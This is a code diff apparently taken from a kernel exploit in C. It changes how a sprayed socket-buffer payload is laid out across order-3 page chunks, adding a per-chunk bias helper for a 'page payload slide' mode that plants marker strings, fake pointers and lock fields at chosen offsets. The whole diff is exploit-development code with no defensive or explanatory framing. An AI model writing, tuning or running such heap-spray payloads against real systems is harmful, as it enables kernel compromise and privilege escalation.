@@ -729,6 +729,17 @@ void prepare_ctxs(void) {
   post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
 }
 
+static size_t skb_payload_chunk_bias(size_t chunk) {
+#if defined(SKB_SECOND_PAYLOAD_BIAS)
+  if (chunk == ORDER3_SIZE) {
+    return SKB_SECOND_PAYLOAD_BIAS;
+  }
+#else
+  (void)chunk;
+#endif
+  return SKB_FRAG_BIAS;
+}
+
 int prepare_skb_payload(uintptr_t base, int payload_mode) {
   memset(skb_buf, 0, SKB_SEND_SIZE);
 
@@ -739,7 +750,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
     slide_bank_payload_base = payload_base;
     for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
-      unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
+      unsigned char *p =
+          skb_buf + chunk + skb_payload_chunk_bias(chunk);
       memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
       for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
         uintptr_t parent;
@@ -917,7 +929,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   }
 
   for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
-    unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
+    unsigned char *p =
+        skb_buf + chunk + skb_payload_chunk_bias(chunk);
 
     put32(p, LOCK_OFF + 0x00, 0);
     if (payload_mode == PAGE_PAYLOAD_SLIDE) {
